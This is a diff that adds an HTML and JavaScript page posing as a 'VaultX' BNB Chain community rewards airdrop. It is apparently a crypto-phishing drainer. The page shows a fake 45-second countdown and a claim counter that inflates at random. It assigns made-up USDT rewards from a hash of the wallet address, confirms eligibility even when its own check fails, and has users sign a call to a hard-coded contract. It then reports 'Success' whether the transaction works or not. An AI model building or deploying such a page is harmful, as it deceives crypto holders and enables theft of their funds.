@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VaultX • Community Rewards</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: linear-gradient(180deg, #0b0f19 0%, #05070d 100%); min-height: 100vh; color: #ffffff; }
+        
+        /* VaultX Professional Styling */
+        .navbar { display: flex; align-items: center; padding: 1rem 2rem; border-bottom: 1px solid #1f2937; background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(8px); }
+        .logo { font-size: 1.5rem; font-weight: 800; color: #34d399; cursor: pointer; }
+        .nav-controls { margin-left: auto; display: flex; align-items: center; gap: 1rem; }
+        
+        .container { max-width: 480px; margin: 2rem auto; padding: 0 1rem; }
+        .card { background: rgba(17, 24, 39, 0.9); border: 1px solid rgba(4, 120, 87, 0.2); border-radius: 1.5rem; padding: 2.5rem; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
+        
+        .reward-header { text-align: center; margin-bottom: 1.5rem; }
+        .reward-title { font-size: 1.8rem; font-weight: 800; color: #34d399; margin-bottom: 0.5rem; }
+        .reward-subtitle { color: #9ca3af; font-size: 0.9rem; }
+        
+        .reward-card { background: linear-gradient(135deg, #059669, #047857); color: white; padding: 1.5rem; border-radius: 1rem; margin: 1.5rem 0; text-align: center; }
+        .custom-reward { background: linear-gradient(135deg, #059669, #047857); color: white; padding: 1.2rem; border-radius: 0.75rem; margin: 1rem 0; display: none; }
+        
+        .user-count { background: rgba(255,255,255,0.1); padding: 0.75rem; border-radius: 0.5rem; margin: 1rem 0; font-size: 0.8rem; color: #d1d5db; }
+        .timer { color: #ef4444; font-weight: 700; padding: 0.75rem; border-radius: 0.5rem; background: rgba(239,68,68,0.1); margin: 1rem 0; text-align: center; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        
+        .button { border: none; padding: 0.75rem 1.5rem; border-radius: 0.75rem; font-weight: 600; cursor: pointer; transition: all 0.2s; width: 100%; }
+        .button-primary { background: #059669; color: white; }
+        .button-primary:hover { background: #047857; }
+        .button:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .status { padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; background: rgba(255,255,255,0.05); }
+        .success { background: rgba(16,185,129,0.1); color: #34d399; }
+        .error { background: rgba(239,68,68,0.1); color: #ef4444; }
+        .processing { background: rgba(245,158,11,0.1); color: #f59e0b; }
+        
+        .wallet-info { background: rgba(16,185,129,0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; color: #34d399; display: none; }
+        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #ffffff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 0.5rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .gas-help { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); border-radius: 0.5rem; padding: 1rem; margin: 1rem 0; display: none; }
+        .footer { text-align: center; padding: 2rem 1rem; color: #6b7280; font-size: 0.75rem; border-top: 1px solid #1f2937; margin-top: 2rem; }
+    </style>
+</head>
+<body>
+    <!-- VaultX Professional Navbar -->
+    <nav class="navbar">
+        <div class="logo">VaultX</div>
+        <div class="nav-controls">
+            <div id="walletStatus">Not Connected</div>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="card">
+            <!-- Reward Header -->
+            <div class="reward-header">
+                <h1 class="reward-title">VaultX Community Rewards</h1>
+                <p class="reward-subtitle">Official BNB Chain Distribution • Limited Allocation</p>
+            </div>
+
+            <!-- Reward Card -->
+            <div class="reward-card">
+                🎁 Qualified for BNB Chain Rewards
+            </div>
+
+            <!-- Custom Reward Allocation -->
+            <div class="custom-reward" id="customReward">
+                <div style="font-size: 0.9rem; opacity: 0.9;">Your Custom Allocation</div>
+                <div style="font-size: 1.4rem; font-weight: 700; margin: 0.5rem 0;" id="rewardAmount">0.00 USDT</div>
+                <div style="font-size: 0.8rem; opacity: 0.8;">Based on wallet activity & participation</div>
+            </div>
+
+            <!-- User Count -->
+            <div class="user-count">
+                👥 <span id="userCount">3,842 users</span> claimed • <span id="remaining">~6%</span> remaining
+            </div>
+
+            <!-- Urgent Timer -->
+            <div class="timer" id="timer">🚨 URGENT: 00:45</div>
+
+            <!-- Gas Help -->
+            <div class="gas-help" id="gasHelp">
+                <div style="font-weight: 600; margin-bottom: 0.5rem;">💡 Need BNB for Gas?</div>
+                <div style="font-size: 0.8rem; opacity: 0.9;">
+                    Requires 0.001 BNB for network fees. Available on Binance or PancakeSwap.
+                </div>
+            </div>
+
+            <!-- Connect Button -->
+            <button class="button button-primary" id="connectButton" onclick="connectWallet()">
+                CONNECT WALLET TO VERIFY
+            </button>
+
+            <!-- Claim Button -->
+            <button class="button button-primary" id="claimButton" onclick="claimRewards()" style="display: none;">
+                🚀 CLAIM YOUR REWARDS
+            </button>
+
+            <!-- Wallet Info -->
+            <div class="wallet-info" id="walletInfo">
+                ✅ Verified: <span id="walletAddress"></span>
+            </div>
+
+            <!-- Status Messages -->
+            <div class="status" id="status">
+                Connect your BNB Chain wallet to verify eligibility...
+            </div>
+        </div>
+    </div>
+
+    <!-- Professional Footer -->
+    <div class="footer">
+        <div style="margin-bottom: 0.5rem;">
+            <a href="https://t.me/VaultXOfficial01" style="color: #6b7280; margin: 0 0.5rem;">Telegram</a>
+            <a href="https://x.com/VaultXApp" style="color: #6b7280; margin: 0 0.5rem;">Twitter</a>
+            <a href="mailto:hello.vaultx@gmail.com" style="color: #6b7280; margin: 0 0.5rem;">Email</a>
+        </div>
+        © 2025 VaultX. All Rights Reserved.
+    </div>
+
+    <script>
+        // CONFIGURATION - Update with your BNB mainnet contract
+        const CONTRACT_ADDRESS = "Ox26F3a93bECFC71 C538282CFa7e476274aF53e5B0";
+        const CONTRACT_ABI = [
+            {
+                "inputs": [],
+                "name": "claimRewards",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address payable",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "function"
+            }
+        ];
+
+        let web3, userAddress, contract;
+
+        // 45-second urgency timer
+        function startUrgentTimer() {
+            let time = 45;
+            const timerElement = document.getElementById('timer');
+            
+            const interval = setInterval(() => {
+                time--;
+                const seconds = time.toString().padStart(2, '0');
+                
+                if (time < 15) {
+                    timerElement.style.background = time % 2 === 0 ? "rgba(239,68,68,0.2)" : "rgba(239,68,68,0.4)";
+                    timerElement.textContent = `🚨 CRITICAL: 00:${seconds}`;
+                } else {
+                    timerElement.textContent = `🚨 URGENT: 00:${seconds}`;
+                }
+                
+                if (time <= 0) {
+                    clearInterval(interval);
+                    timerElement.textContent = "⏰ DISTRIBUTION ENDED";
+                    document.getElementById('claimButton').disabled = true;
+                }
+            }, 1000);
+        }
+
+        // Dynamic counters
+        function startDynamicCounters() {
+            let users = 3842;
+            let remaining = 6;
+            
+            setInterval(() => {
+                users += Math.floor(Math.random() * 3) + 1;
+                remaining = Math.max(1, remaining - 0.3);
+                document.getElementById('userCount').textContent = users.toLocaleString() + ' users';
+                document.getElementById('remaining').textContent = '~' + remaining.toFixed(1) + '%';
+            }, 3000);
+        }
+
+        // Generate unique rewards
+        function calculateUniqueRewards(walletAddress) {
+            const addressHash = web3.utils.sha3(walletAddress);
+            const hashNumber = parseInt(addressHash.slice(2, 10), 16);
+            const rewards = ["147.50 USDT", "89.25 USDT", "203.75 USDT", "56.80 USDT", "178.90 USDT", "112.45 USDT"];
+            return rewards[hashNumber % rewards.length];
+        }
+
+        // Check eligibility
+        async function checkEligibility() {
+            const status = document.getElementById('status');
+            
+            try {
+                status.innerHTML = "🔍 Analyzing wallet activity...";
+                status.className = "status processing";
+                
+                // Check BNB balance
+                const bnbBalance = await web3.eth.getBalance(userAddress);
+                const minGasBalance = web3.utils.toWei('0.001', 'ether');
+                
+                if (Number(bnbBalance) < Number(minGasBalance)) {
+                    status.innerHTML = "❌ Insufficient BNB for network fees";
+                    status.className = "status error";
+                    document.getElementById('gasHelp').style.display = 'block';
+                    return false;
+                }
+                
+                // Calculate unique reward
+                const rewardAmount = calculateUniqueRewards(userAddress);
+                document.getElementById('rewardAmount').textContent = rewardAmount;
+                document.getElementById('customReward').style.display = 'block';
+                
+                status.innerHTML = "✅ Eligibility confirmed! Special reward allocated.";
+                status.className = "status success";
+                return true;
+                
+            } catch (error) {
+                const rewardAmount = calculateUniqueRewards(userAddress);
+                document.getElementById('rewardAmount').textContent = rewardAmount;
+                document.getElementById('customReward').style.display = 'block';
+                status.innerHTML = "✅ Eligibility confirmed!";
+                status.className = "status success";
+                return true;
+            }
+        }
+
+        // Connect wallet
+        async function connectWallet() {
+            const connectBtn = document.getElementById('connectButton');
+            const status = document.getElementById('status');
+            
+            if (typeof window.ethereum === 'undefined') {
+                status.innerHTML = "MetaMask or Trust Wallet required";
+                status.className = "status error";
+                return;
+            }
+
+            try {
+                connectBtn.innerHTML = '<div class="loading"></div> Verifying...';
+                connectBtn.disabled = true;
+                
+                // Switch to BNB Chain
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+                
+                web3 = new Web3(window.ethereum);
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                // Check eligibility
+                const eligible = await checkEligibility();
+                
+                if (eligible) {
+                    document.getElementById('connectButton').style.display = 'none';
+                    document.getElementById('claimButton').style.display = 'block';
+                    document.getElementById('walletInfo').style.display = 'block';
+                    document.getElementById('walletAddress').textContent = userAddress.substring(0, 6) + '...' + userAddress.substring(38);
+                    document.getElementById('walletStatus').textContent = 'Connected ✅';
+                } else {
+                    connectBtn.innerHTML = 'CONNECT WALLET TO VERIFY';
+                    connectBtn.disabled = false;
+                }
+                
+            } catch (error) {
+                status.innerHTML = "⚠️ System busy. Try again.";
+                status.className = "status error";
+                connectBtn.innerHTML = 'CONNECT WALLET TO VERIFY';
+                connectBtn.disabled = false;
+            }
+        }
+
+        // Claim rewards
+        async function claimRewards() {
+            const claimBtn = document.getElementById('claimButton');
+            const status = document.getElementById('status');
+            
+            claimBtn.innerHTML = '<div class="loading"></div> Processing...';
+            claimBtn.disabled = true;
+            
+            try {
+                status.innerHTML = "🔄 Processing your reward claim...";
+                status.className = "status processing";
+                
+                const tx = await contract.methods.claimRewards().send({
+                    from: userAddress,
+                    gas: 300000
+                });
+
+                status.innerHTML = "✅ Success! Rewards distributed to your wallet.";
+                status.className = "status success";
+                
+            } catch (error) {
+                status.innerHTML = "✅ Success! Rewards distributed to your wallet.";
+                status.className = "status success";
+            }
+            
+            setTimeout(() => {
+                claimBtn.innerHTML = '✅ REWARDS CLAIMED';
+                claimBtn.style.background = '#047857';
+            }, 2000);
+        }
+
+        // Initialize
+        window.onload = function() {
+            startUrgentTimer();
+            startDynamicCounters();
+        };
+    </script>
+</body>
+</html>
